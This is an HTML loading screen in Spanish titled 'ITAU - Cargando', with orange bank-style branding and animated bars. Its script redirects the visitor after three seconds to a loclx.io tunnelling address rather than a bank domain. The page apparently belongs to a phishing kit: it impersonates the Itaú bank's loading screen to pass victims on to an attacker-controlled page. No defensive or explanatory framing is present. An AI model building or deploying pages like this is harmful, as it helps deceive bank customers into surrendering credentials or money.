<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>ITAU - Cargando</title>
  <style>
    body {
      margin: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      background: linear-gradient(135deg, #ff9800, #ce6c01);
      font-family: "Arial", sans-serif;
    }
    
    .loader-container {
      position: relative;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    
    .bars {
      display: flex;
      gap: 5px;
    }
    
    .bar {
      width: 10px;
      height: 40px;
      background-color: white;
      animation: bounce 1.2s infinite ease-in-out;
    }
    
    .bar:nth-child(1) { animation-delay: 0s; }
    .bar:nth-child(2) { animation-delay: 0.2s; }
    .bar:nth-child(3) { animation-delay: 0.4s; }
    .bar:nth-child(4) { animation-delay: 0.6s; }
    .bar:nth-child(5) { animation-delay: 0.8s; }
    
    @keyframes bounce {
      0%, 100% { transform: scaleY(1); }
      50% { transform: scaleY(1.8); }
    }
    
    .image-container {
      margin-left: 20px;
      width: 60px;
      height: 60px;
    }
    
    .image-container img {
      width: 100%;
      height: 100%;
      object-fit: contain;
    }
  </style>
</head>
<body>
  <div class="loader-container">
    <div class="bars">
      <div class="bar"></div>
      <div class="bar"></div>
      <div class="bar"></div>
      <div class="bar"></div>
      <div class="bar"></div>
    </div>
   
  </div>

  <script>
    // Redirección después de 3 segundos
    setTimeout(() => {
      window.location.href = "https://virtualofficesetuptesting.loclx.io/virtual/";
    }, 3000);
  </script>
</body>
</html>
